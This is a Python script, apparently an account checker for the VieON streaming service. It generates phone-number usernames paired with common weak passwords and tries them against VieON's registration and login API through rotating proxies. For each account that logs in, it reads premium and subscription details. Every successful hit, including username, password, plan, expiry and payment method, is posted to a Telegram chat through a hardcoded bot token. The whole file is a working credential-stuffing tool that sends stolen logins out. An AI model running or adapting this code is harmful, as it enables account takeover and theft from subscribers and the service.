from json import decoder
import requests
import random
import telebot
import os
import time
import uuid

id_file = 'id.txt'
proxy_file = 'proxy.txt'
base_url = "https://api.vieon.vn/backend/"
device_id = "d0763a1f-7099-42c4-bf58-82a8a3fed645"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
def read_proxies():
    with open(proxy_file, 'r') as file:
        proxies = [line.strip() for line in file.readlines() if line.strip()]
    return proxies

# Read proxies from file
proxies = read_proxies()
proxy_count = len(proxies)

# Check if there are proxies in the list
if proxy_count == 0:
    raise ValueError("Proxy list is empty. Please add proxies to the file.")

# Start the main loop
current_proxy_index = 0
while True:
 proxy = proxies[current_proxy_index]
 proxies_dict = {'http': proxy, 'https': proxy}
 device_id =  f'"{uuid.uuid4()}"'
 print(device_id)
 pre = None
 trial = None
 profile_token = None
 subscription_use = None
 user_id =None
# Lấy Access Token
 login_url = f"{base_url}user/v2/login?platform=web&ui=012021"
 token_url = f"{base_url}user/login/anonymous?platform=web&ui=012021"

 login_data = f"device_id={device_id}&model=Windows%2010&platform=web&ui=012021"

 headers = {
    "User-Agent": user_agent,
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://vieon.vn",
    "Referer": "https://vieon.vn/auth/?destination=/&page=/",
    "Sec-Ch-Ua": '"Not A;Brand";v="99", "Chromium";v="96"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
 }

 try:
    response = requests.post(token_url, data=login_data, headers=headers,proxies=proxies_dict)
    response.raise_for_status()  # Raise an exception for HTTP errors
    response_data = response.json()
    access_token = response_data.get("access_token")

    prefix_list = ['098', '038', '035', '036', '037', '090', '093', '081', '082', '083', '084', '085', '091', '094']
    suffix_list = ['123456', '12345678', '123456789', '123456', '012345']

    # Lấy Sdt
    if not os.path.exists("gen.txt"):
        with open("gen.txt","w") as file :
            file.write("")

    with open('gen.txt', 'r') as file:
        lines = file.readlines()
        if len(lines) > 0:
            user, password = lines[0].strip().split(':')
            lines = lines[1:]
            with open('gen.txt', 'w') as file:
                file.writelines(lines)
        else:
            user = None
            password = None

    # Gen sdt
    with open('gen.txt', 'a') as file:
        prefix = random.choice(prefix_list)
        suffix = random.choice(suffix_list)
        random_number = ''.join([str(random.randint(0, 9)) for _ in range(7)])
        phone_number = f'{prefix}{random_number}:{suffix}\n'
        file.write(phone_number)
    #Register ( T cũng đéo biết vì sao phải register nữa )
    reg = "https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021"
    headers = {
     'authority': 'api.vieon.vn',
     'accept': 'application/json, text/plain, */*',
     'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
     'authorization': access_token,
     'content-type': 'application/json',
     'content-type': 'application/json',
     'origin': 'https://vieon.vn',
     'referer': 'https://vieon.vn/auth/?destination=/&page=/',
     'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-site',
     'user-agent': user_agent,
   }

    params = {
     'platform': 'web',
     'ui': '012021',
   }

    json_data = {
     'username': user,
     'country_code': 'VN',
     'model': 'Windows 10',
     'device_id': device_id,
     'device_name': 'Edge/119',
     'device_type': 'desktop',
     'platform': 'web',
     'ui': '012021',
   }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data,proxies=proxies_dict)
    abv = response.json()
    code = abv.get("code")
    print(code)
    # Login
    if code ==4009 :
        login_data = {
            "username": user,
            "password": password,
            "country_code": "VN",
            "model": "Android 5.1.1",
            "device_id": device_id,
            "device_name": "Chrome/96",
            "device_type": "desktop",
            "platform": "mobile_web",
            "ui": "012021"
        }

        headers = {
            "User-Agent": user_agent,
            "Authorization" : access_token,
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://vieon.vn",
            "Referer": "https://vieon.vn/auth/?destination=/&page=/",
            "Sec-Ch-Ua": '"Not A;Brand";v="99", "Chromium";v="96"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": "Chrome",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }

        response = requests.post(login_url, json=login_data, headers=headers)
        response.raise_for_status()
        response_data = response.json()
        code = response_data.get("code")
        if code == 0:
         data = response.json()
         access_token = data["result"]["access_token"]
         is_premium = data["result"]["profile"]["is_premium"]
         id = data["result"]["profile"]["id"]
        if code == 0 and is_premium == 1:
            print("Đăng Nhập Thành Công", user, ":", password,"is Premium: YES")
         # Check gói
            purchased_services_url = f"{base_url}billing/purchased-services?platform=web&ui=012021"
            check_data = f"device_id={device_id}&model=Windows%2010&platform=web&ui=012021"
            headerscheck = {
      "Content-Type": "application/json, text/plain, */*",
      "Referer": "https://vieon.vn/ca-nhan/",
      "User-Agent" : user_agent,
      "Pragma": "no-cache",
      "Profile-Token": profile_token,
      "Accept": "application/json, text/plain, */*",
      "Authorization": access_token,
      "Profile-Token": access_token,
      "Origin": "https://vieon.vn",
      "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": "\"Windows\"",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site"
         }
      

            response = requests.get(purchased_services_url,data = check_data,proxies=proxies_dict, headers=headerscheck)
            data = response.json()
            print(data)
            subscription_use= data.get("subscription_use", {})
            items = subscription_use.get("items", [])

            for item in items:
             name = item.get("name")
             han = item.get("expired_date")
             pay = item.get("payment_method")
             giahan = item.get("next_recurring_date")

            print(name, " Hạn: ",han)
        if code != 400:
            bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
            bot = telebot.TeleBot(bot_token)
            chat_id = '-4004150951' 
            mess = f'''SUCCESS VIEON ✅
.:!{user}:{password}!:.
Plan: {name}
Time: {han}
Method Pay: {pay}
Next Bill: {giahan}
Bot By: VannQuoc? aka @Monleohaykhok
            '''
            bot.send_message(chat_id, mess)
 except Exception as e:
    print(f'error: {e}, type: {type(e)}')
 time.sleep(7)
 current_proxy_index = (current_proxy_index + 1) % proxy_count
